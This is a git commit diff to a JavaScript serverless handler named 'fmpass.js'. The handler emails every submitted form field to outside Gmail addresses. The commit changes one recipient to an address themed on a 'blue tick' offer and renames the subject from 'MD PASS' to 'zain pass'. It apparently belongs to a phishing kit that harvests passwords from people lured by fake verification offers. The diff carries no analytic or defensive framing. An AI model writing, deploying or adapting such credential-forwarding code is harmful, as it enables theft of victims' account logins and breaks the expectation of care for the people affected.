ac29f00d20074318ed79e85eeb607eac78aa4ab2
dadankhan096-hue <dadankhan096@gmail.com>
2025-12-31 03:57:25 -0800

    Update fmpass.js

--- fmpass.js
+++ fmpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "adsmenigar@gmail.com,donem8575@gmail.com",
-      subject: "MD PASS",
+      to: "adsmenigar@gmail.com,get.blue.tick.opportunity8382@gmail.com",
+      subject: "zain pass",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
